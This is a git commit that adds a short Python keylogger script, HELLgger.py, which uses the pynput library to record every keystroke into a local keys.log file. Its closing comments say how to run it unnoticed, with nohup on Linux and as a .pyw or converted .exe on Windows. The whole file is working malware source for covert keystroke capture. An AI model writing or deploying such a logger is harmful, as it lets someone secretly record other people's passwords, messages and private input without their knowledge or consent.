4bd1163a2d33e8fe630eaf40c084fd6fd5088b2d
Arya <aryaakanani@gmail.com>
2021-10-23 12:56:42 +0330

    Create HELLgger.py

---
+++ HELLgger.py
@@ -0,0 +1,36 @@
+#   @aryakanani1
+#importing libraries
+from pynput.keyboard import Key, Listener
+keys = []
+def on_keypress(key):
+
+    keys.append(key)
+    for key in keys:
+        log_keys(key)
+#helper
+def log_keys(key):
+    
+    with open("keys.log", 'a') as logfile:
+        
+        key = str(key).replace("'", "")
+        
+        if key.find("backspace") > 0:
+            logfile.write(" backspcae ")
+        elif key.find("space") > 0:
+            logfile.write(" ")
+        elif key.find("shift") > 0:
+            logfile.write(" shift ")
+        elif key.find("enter") > 0:
+            logfile.write("\n")
+        elif key.find("caps_lock") > 0:
+            logfile.write(" capslock ")
+        else:
+            logfile.write(key)
+       
+        keys.clear()
+with Listener(on_press=on_keypress) as listener :
+     listener.join()
+
+#if you are using this on linux just install the necessary libs
+#use nohup command for run it without noticing :)
+#on windows save the .py file and change the format to .pyw or simply turn it into .exe using 3rd party apps.
